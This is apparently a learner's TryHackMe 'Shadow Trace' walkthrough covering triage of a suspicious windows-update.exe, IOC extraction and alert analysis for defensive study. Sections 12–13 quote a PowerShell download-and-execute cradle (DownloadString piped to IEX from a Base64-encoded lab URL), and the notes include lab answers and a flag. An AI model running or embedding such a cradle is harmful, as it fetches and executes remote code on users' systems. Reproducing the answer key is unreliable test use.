# Shadow Trace — TryHackMe Walkthrough & Malware Analysis Notes

> **Lab:** TryHackMe — Shadow Trace  
> **Focus:** Windows malware triage, static analysis, IOC extraction, alert analysis, PowerShell investigation  
> **Binary:** `C:\Users\DFIRUser\Desktop\windows-update.exe`

---

## 1. Overview

In this lab, I analysed a suspicious Windows executable named `windows-update.exe`.

The goal was to perform basic file analysis, identify useful Indicators of Compromise (IOCs), inspect imported libraries, and then investigate security alerts involving `powershell.exe` and `chrome.exe`.

### What I practised

- Identifying executable architecture
- Calculating and using SHA-256 hashes
- Extracting strings from a binary
- Finding URLs and domains inside a binary
- Decoding Base64 data
- Identifying Windows DLL imports
- Investigating PowerShell command lines
- Recognising suspicious download-and-execute behaviour
- Extracting filenames from security alerts
- Turning analysis findings into useful IOCs

---

# 2. Lab Environment

The TryHackMe machine provides several DFIR and malware-analysis tools.

The suspicious executable is located at:

```text
C:\Users\DFIRUser\Desktop\windows-update.exe
```

Additional tools are available under:

```text
C:\Users\DFIRUser\DFIR Tools
```

The lab should be treated as an isolated analysis environment. I should never execute unknown malware on my normal Windows machine.

---

# 3. Task 2 — File Analysis

## 3.1 Identify the Architecture

### Question

**What is the architecture of `windows-update.exe`?**

### Answer

```text
64-bit
```

### Why architecture matters

The architecture tells us which processor environment the executable was designed for.

Common Windows executable architectures include:

- 32-bit / x86
- 64-bit / x64

Knowing the architecture helps an analyst choose appropriate analysis tools and understand how the binary is expected to execute.

---

# 4. SHA-256 Hash

## Question

**What is the SHA-256 hash of `windows-update.exe`?**

### Answer

```text
B2A88DE3E3BCFAE4A4B38FA36E884C586B5CB2C2C283E71FBA59EFDB9EA64BFC
```

## What is a hash?

A cryptographic hash is a fixed-length value calculated from a file's contents.

For example:

```text
File
 ↓
Hash algorithm
 ↓
SHA-256
 ↓
Unique-looking fingerprint
```

The important point for SOC work is that the hash can be used as a file IOC.

If the same file appears somewhere else, the SHA-256 value can help identify it even if the filename has been changed.

### Common hashes

```text
MD5
SHA-1
SHA-256
```

SHA-256 is generally preferred for modern file identification.

---

# 5. URL Extraction

One of the most useful steps was searching the executable for strings.

The suspicious URL found inside the file was:

```text
http://tryhatme.com/update/security-update.exe
```

This can be treated as an IOC.

## Why URLs inside malware matter

A malware sample may contain:

- Download locations
- Command-and-control addresses
- Payload URLs
- Callback endpoints
- Tracking infrastructure

Finding a URL does not automatically prove exactly how the malware will use it, but it gives the analyst something that can be investigated and searched for across security telemetry.

---

# 6. Finding the Domain IOC

From the analysis, the domain identified as an IOC was:

```text
responses.tryhatme.com
```

## IOC

**IOC = Indicator of Compromise**

Examples include:

```text
IP address
Domain
URL
File hash
Filename
Registry key
Email address
Mutex
Process name
```

In a SOC, IOCs can be searched across:

- SIEM logs
- DNS logs
- Proxy logs
- EDR telemetry
- Firewall logs
- Email security logs
- Endpoint investigations

---

# 7. Base64 Decoding

The lab provided an encoded value:

```text
VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
```

After Base64 decoding:

```text
THM{you_g0t_some_IOCs_friend}
```

## What is Base64?

Base64 is an encoding scheme that represents binary or text data using a limited set of characters.

It is **not encryption**.

Anyone who has the encoded data can decode it.

### Example workflow

```text
Base64 string
     ↓
Decode
     ↓
Original text
```

---

# 8. CyberChef

One tool used during the investigation was **CyberChef**.

CyberChef is a web-based data transformation tool commonly used by analysts for tasks such as:

- Base64 decoding
- URL decoding
- Hex decoding
- Encoding/decoding
- Text transformations
- Hashing
- Data extraction

## Base64 decoding with CyberChef

Basic workflow:

1. Open CyberChef.
2. Put the encoded value into the input area.
3. Search for `From Base64`.
4. Add `From Base64` to the recipe.
5. Read the decoded output.

For this lab:

```text
VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
```

becomes:

```text
THM{you_g0t_some_IOCs_friend}
```

### SOC use case

If an alert contains something like:

```text
powershell -EncodedCommand ...
```

or another Base64-looking value, an analyst may decode it to understand what the command is attempting to do.

**Important:** Decoding suspicious content is different from executing it.

---

# 9. Strings

Another important technique was extracting readable strings from the binary.

On Windows PowerShell, the walkthrough used:

```powershell
strings .\windows-update.exe | findstr "tryhatme"
```

This searches the output of `strings` for text containing `tryhatme`.

## What does `strings` do?

The `strings` utility extracts readable character sequences from a binary.

Malware may contain strings such as:

```text
http://example.com
powershell
cmd.exe
CreateProcess
User-Agent
registry
password
```

These strings can provide clues about the functionality of a binary.

## Why `strings` is useful

It is a fast first-pass technique.

It can help find:

- URLs
- Domains
- IP addresses
- File paths
- Commands
- DLL names
- API names
- Error messages
- Configuration values

## Important limitation

A malware sample may:

- Encrypt strings
- Encode strings
- Compress strings
- Obfuscate strings
- Build strings dynamically

Therefore, `strings` alone cannot prove that a file is malicious or reveal everything it does.

---

# 10. Windows Socket Library

## Question

**What library related to socket communication is loaded by the binary?**

### Answer

```text
WS2_32.dll
```

## What is WS2_32.dll?

`WS2_32.dll` is a Windows networking library associated with the Windows Sockets API, commonly called Winsock.

Applications can use Winsock functionality for network communication.

### Why this matters during malware analysis

If a suspicious executable imports networking-related functionality, an analyst may investigate whether it:

- Connects to external servers
- Sends data
- Receives commands
- Downloads additional content
- Communicates with infrastructure

However, an import of `WS2_32.dll` alone does **not** prove malicious network activity.

It is the surrounding evidence that matters.

---

# 11. Task 3 — Alerts Analysis

The next part of the lab involved analysing security alerts from a static site.

The goal was to identify suspicious activity associated with different processes.

---

# 12. PowerShell Alert

## Question

**Can you identify the malicious URL from the trigger by `powershell.exe`?**

### Answer

```text
https://tryhatme.com/dev/main.ex
```

The alert contained a PowerShell command similar to:

```powershell
(new-object system.net.webclient).DownloadString([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"))) | IEX;
```

---

# 13. Breaking Down the PowerShell Command

This command is important from a SOC perspective because it demonstrates several suspicious behaviours.

## Step 1 — Base64 decoding

The command contains:

```powershell
[Convert]::FromBase64String(...)
```

This converts Base64 data back into its original byte representation.

Then:

```powershell
[Text.Encoding]::UTF8.GetString(...)
```

converts the bytes into text.

The decoded value is:

```text
https://tryhatme.com/dev/main.exe
```

---

## Step 2 — DownloadString

The command uses:

```powershell
DownloadString(...)
```

This indicates that PowerShell is retrieving content from a remote location.

The important investigation question is:

> Why is PowerShell downloading content from this external URL?

---

## Step 3 — IEX

The command ends with:

```powershell
| IEX
```

`IEX` is an alias for:

```powershell
Invoke-Expression
```

It evaluates a string as PowerShell code.

This combination is particularly interesting:

```text
Remote URL
   ↓
Download content
   ↓
Pass content to IEX
   ↓
Execute it as PowerShell
```

For a SOC analyst, this is a strong reason to investigate the process tree, parent process, user, network connection, command line, and endpoint activity.

---

# 14. How to Investigate Suspicious PowerShell

When an alert shows suspicious PowerShell, I would look at:

### Process information

```text
Process name
Parent process
Child processes
PID
User
Integrity level
Command line
```

### Network information

```text
Destination domain
Destination IP
Destination port
DNS queries
HTTP/HTTPS requests
```

### Endpoint information

```text
Files created
Registry modifications
Scheduled tasks
Persistence mechanisms
Credential access
Security-control changes
```

### Timeline

```text
Initial execution
 ↓
PowerShell started
 ↓
Network connection
 ↓
Payload downloaded
 ↓
Payload executed
 ↓
Follow-on activity
```

This turns one suspicious command into an incident timeline.

---

# 15. Chrome Alert

## Question

**Can you identify the malicious URL from the alert triggered by `chrome.exe`?**

### Answer

```text
https://reallysecureupdate.tryhatme.com/update.exe
```

The important IOC here is the suspicious domain and URL associated with the browser process.

---

# 16. Why Browser Activity Can Matter

A browser process does not automatically mean that the user intentionally visited a malicious website.

Possible explanations for suspicious browser network activity include:

- User navigation
- Malicious advertisement
- Compromised website
- Malicious redirect
- Drive-by download
- Browser extension
- Phishing page
- Downloaded payload

Therefore, the analyst should correlate browser telemetry with:

- DNS
- Proxy
- EDR
- Download events
- File creation
- User activity
- Referrer information where available

---

# 17. File Created by Chrome

## Question

**What is the name of the file saved in the alert triggered by `chrome.exe`?**

### Answer

```text
test.txt
```

This is another useful artifact for investigation.

A SOC analyst would typically investigate:

```text
Where was test.txt created?
Who created it?
What created it?
What is its hash?
What is inside it?
Was it executed?
Was another process launched?
```

---

# 18. Important Tools Used

## 18.1 `strings`

### Purpose

Extract readable strings from files.

### Example

```powershell
strings .\windows-update.exe
```

### Filter output

```powershell
strings .\windows-update.exe | findstr "tryhatme"
```

### Useful for

```text
URLs
Domains
Commands
File paths
API names
Configuration
```

### Limitation

Obfuscation and encryption can hide important strings.

---

# 19. `findstr`

`findstr` is a Windows command-line utility used to search text.

Example:

```powershell
strings .\windows-update.exe | findstr "tryhatme"
```

The pipeline works like this:

```text
windows-update.exe
       ↓
     strings
       ↓
Readable strings
       ↓
    findstr
       ↓
Matching lines
```

This is useful when `strings` produces a large amount of output.

---

# 20. PowerShell

PowerShell is Microsoft's command-line shell and scripting environment.

It is a legitimate administrative tool used extensively by system administrators and defenders.

However, attackers also abuse it because it provides powerful capabilities for:

- System administration
- Process execution
- Network communication
- File manipulation
- Automation
- Remote management

### SOC rule

Do not treat:

```text
powershell.exe
```

as automatically malicious.

Instead, investigate the **context**.

For example:

```text
powershell.exe
   +
encoded command
   +
external download
   +
Invoke-Expression
```

is much more suspicious than ordinary administrative PowerShell activity.

---

# 21. Base64

### Example

```text
VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
```

Decoded:

```text
THM{you_g0t_some_IOCs_friend}
```

### Useful tools

- CyberChef
- PowerShell
- Python
- Linux `base64`

### Linux example

```bash
echo 'BASE64_VALUE' | base64 -d
```

### PowerShell example

```powershell
[Text.Encoding]::UTF8.GetString(
    [Convert]::FromBase64String("BASE64_VALUE")
)
```

---

# 22. CyberChef — Analyst Workflow

A useful basic workflow is:

```text
Suspicious encoded data
        ↓
Identify encoding
        ↓
CyberChef
        ↓
Decode
        ↓
Inspect result
        ↓
Extract IOC / behaviour
        ↓
Correlate with logs
```

CyberChef can also be useful for:

```text
URL decoding
Hex decoding
Base64
ROT13
Hashing
Defanging
Data transformations
```

---

# 23. IOC Summary

| IOC Type | Value |
|---|---|
| File | `windows-update.exe` |
| Architecture | 64-bit |
| SHA-256 | `B2A88DE3E3BCFAE4A4B38FA36E884C586B5CB2C2C283E71FBA59EFDB9EA64BFC` |
| URL | `http://tryhatme.com/update/security-update.exe` |
| Domain | `responses.tryhatme.com` |
| Socket library | `WS2_32.dll` |
| PowerShell URL | `https://tryhatme.com/dev/main.exe` |
| Chrome URL | `https://reallysecureupdate.tryhatme.com/update.exe` |
| Saved file | `test.txt` |

---

# 24. My Investigation Flow

This is the workflow I followed in the lab:

```text
Start TryHackMe Machine
        ↓
Locate windows-update.exe
        ↓
Identify architecture
        ↓
Calculate / obtain SHA-256
        ↓
Extract strings
        ↓
Search for suspicious domains / URLs
        ↓
Identify responses.tryhatme.com
        ↓
Decode Base64
        ↓
Identify WS2_32.dll
        ↓
Move to alert analysis
        ↓
Inspect powershell.exe alert
        ↓
Decode embedded URL
        ↓
Identify https://tryhatme.com/dev/main.exe
        ↓
Inspect chrome.exe alert
        ↓
Identify suspicious URL
        ↓
Identify created file: test.txt
        ↓
Record IOCs
```

---

# 25. What I Learned

This lab helped me understand how a SOC analyst can move from a suspicious file to useful investigation evidence.

### File analysis

I learned that a suspicious executable can be quickly profiled using:

```text
Architecture
Hash
Strings
Imports
URLs
Domains
```

### IOC extraction

I learned that a single suspicious binary can contain several useful indicators:

```text
Hash
Domain
URL
Filename
DLL
```

### PowerShell analysis

I learned that suspicious PowerShell should be analysed by looking at the full command rather than simply flagging the process name.

The following combination was especially important:

```text
Base64 decoding
        +
DownloadString
        +
Invoke-Expression
```

### Alert analysis

I also learned that process alerts can provide useful context about:

```text
Which process executed
What command was executed
Which URL was contacted
What file was created
```

---

# 26. SOC Analyst Perspective

If I encountered a similar alert in a real SOC environment, I would not stop after finding one malicious URL.

I would try to determine:

### 1. Initial access

How did the activity start?

```text
Phishing?
Browser?
Malicious document?
Downloaded executable?
```

### 2. Execution

What executed the suspicious code?

```text
powershell.exe
cmd.exe
chrome.exe
wscript.exe
mshta.exe
```

### 3. Network activity

What infrastructure did the endpoint contact?

```text
Domain
IP
URL
Port
DNS query
```

### 4. Payload

Was anything downloaded?

```text
Filename
Path
Hash
File type
```

### 5. Follow-on activity

What happened after execution?

```text
New process
Persistence
Credential access
Data collection
Lateral movement
```

### 6. Scope

Did other machines contact the same IOC?

This is where SIEM and EDR become extremely valuable.

---

# 27. Detection Ideas

The behaviour observed in this lab can lead to detection opportunities.

Potential suspicious combinations include:

```text
PowerShell
+
Encoded content
+
External network connection
```

or:

```text
PowerShell
+
DownloadString
+
Invoke-Expression
```

or:

```text
Browser
+
Suspicious domain
+
Unexpected executable download
```

A SOC should ideally correlate multiple signals instead of relying on a single indicator.

---

# 28. Questions and Answers

## Task 2

### What is the architecture?

```text
64-bit
```

### What is the SHA-256?

```text
B2A88DE3E3BCFAE4A4B38FA36E884C586B5CB2C2C283E71FBA59EFDB9EA64BFC
```

### What URL is present?

```text
http://tryhatme.com/update/security-update.exe
```

### What domain can be used as an IOC?

```text
responses.tryhatme.com
```

### What is the decoded flag?

```text
THM{you_g0t_some_IOCs_friend}
```

### What socket communication library is loaded?

```text
WS2_32.dll
```
## Task 3

### Malicious URL from powershell.exe

```text
https://tryhatme.com/dev/main.exe
```

### Malicious URL from chrome.exe

```text
https://reallysecureupdate.tryhatme.com/update.exe
```

### File saved by chrome.exe

```text
test.txt
```

---

# 29. Key Takeaways

> **A suspicious file is not just a filename.**

The useful evidence can be found in:

```text
Hash
Strings
Imports
URLs
Domains
Processes
Command lines
Network connections
Files created
```

The most important SOC lesson from this lab is **correlation**.

One event by itself may not tell the full story.

But:

```text
Suspicious executable
      +
Suspicious URL
      +
PowerShell download
      +
Encoded command
      +
Execution
      +
File creation
```

can form a much clearer incident timeline.

---


